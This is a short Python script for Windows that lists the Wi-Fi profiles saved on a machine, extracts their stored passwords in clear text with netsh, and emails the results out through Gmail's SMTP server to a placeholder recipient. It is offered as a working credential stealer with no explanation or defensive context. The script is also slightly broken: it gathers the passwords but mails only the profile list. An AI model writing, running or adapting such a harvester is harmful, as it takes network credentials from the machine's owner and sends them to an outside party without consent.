#!/usr/bin/env python

import subprocess
import smtplib
import re

def get_previous_wifi_networks():
    result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
    return result.stdout

def get_passwords(previous_networks):
    profile_names = re.findall(r'All User Profile\s*: (.*)', previous_networks)
    passwords = []
    for profile_name in profile_names:
        password_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name="{profile_name}"', 'key=clear']).decode('utf-8')
        password = re.search(r'Key Content\s*: (.*)', password_output)
        if password:
            passwords.append(password.group(1))
    return passwords

def send_email(sender_email, receiver_email, password, subject, message):
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
        server.quit()
    except Exception as e:
        print(f"An error occurred while sending the email: {e}")

# Get previous WiFi networks
previous_networks = get_previous_wifi_networks()

# Get passwords
passwords = get_passwords(previous_networks)


# Email details
sender_email = 'your-email@gmail.com'
receiver_email = 'recipient-email@example.com'
password = 'your-password'
subject = 'Previous WiFi Networks'
message = f'Subject: {subject}\n\n{previous_networks}'

# Send the email
send_email(sender_email, receiver_email, password, subject, message)
